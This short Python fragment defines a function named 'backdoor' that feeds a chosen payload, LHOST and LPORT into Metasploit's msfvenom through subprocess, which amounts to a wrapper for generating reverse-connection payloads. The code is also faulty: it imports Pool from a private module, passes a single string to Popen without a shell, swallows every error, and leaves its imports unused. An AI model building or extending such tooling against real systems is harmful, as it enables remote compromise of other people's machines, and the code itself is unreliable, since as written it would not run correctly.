import sys
import subprocess
from _multiprocessing import Pool


def backdoor(payload, lhost, lport):
    try:
        subprocess.Popen(
            "msfvenom -p {} LHOST={} LPORT={}".format(payload, lhost, lport)
        )

    except:
        return "error"
